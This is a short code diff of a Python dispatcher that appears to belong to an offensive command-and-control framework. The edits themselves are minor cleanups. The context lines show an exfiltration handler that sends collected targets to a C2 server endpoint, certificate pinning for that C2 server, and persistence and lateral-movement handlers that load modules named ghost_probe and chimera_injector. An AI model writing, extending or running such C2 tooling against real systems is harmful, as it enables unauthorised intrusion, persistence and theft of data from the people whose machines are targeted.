@@ -9,7 +9,6 @@ import time
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from pathlib import Path
-from typing import Any
 
 ZDS_ROOT = Path(__file__).parent
 # OWN_ROOT: optional sibling-repo workspace path (LANimals/OWN phase modules).
@@ -33,7 +32,7 @@ def _pinned_session(fingerprint: str):
     Set ZDS_C2_CERT_FINGERPRINT to the hex SHA256 fingerprint of the C2
     server certificate (no colons, lowercase).
     """
-    import hashlib, ssl, socket
+    import hashlib, ssl
     import requests
     from requests.adapters import HTTPAdapter
     from urllib3.util.ssl_ import create_urllib3_context
@@ -70,12 +69,12 @@ def _pinned_session(fingerprint: str):
 
 
 def _handle_exfil(action_obj, mutation, c2_ip, c2_port):
-    import hmac, requests, uuid, os
-    targets  = action_obj.get("targets", [])
+    import requests, uuid, os
     agent_id = os.environ.get("ZDS_AGENT_ID", str(uuid.uuid4())[:8])
     token    = os.environ.get("ZDS_AUTH_TOKEN", "")
     endpoint = os.environ.get("ZDS_HTTPS_ENDPOINT", f"https://{c2_ip}:{c2_port}")
     url      = f"{endpoint}/data/{agent_id}"
+    targets  = action_obj.get("targets", [])
     payload  = {
         "targets":      targets,
         "payload_hash": mutation.payload_hash,
@@ -184,7 +183,7 @@ def _handle_persist(action_obj, mutation):
         return {"success": False, "detected": False, "channel": "local", "latency_ms": 0.0, "error": str(e)}
 
 def _handle_lateral(action_obj, mutation):
-    targets = action_obj.get("targets", [])
+    _targets = action_obj.get("targets", [])  # reserved for future use
     try:
         import ghost_probe
         import chimera_injector
@@ -278,7 +277,7 @@ class Dispatcher:
         if drift_status == "WARN":
             print(f"[WARN] Drift elevated — drift={drift_score:.3f}")
 
-        entropy_result = self.entropy.ingest(action_obj, action_obj.get("_raw_cmd", ""))
+        self.entropy.ingest(action_obj, action_obj.get("_raw_cmd", ""))
         entropy_score  = self.entropy.current_entropy()
         entropy_status = self.entropy.report()["status"]
 
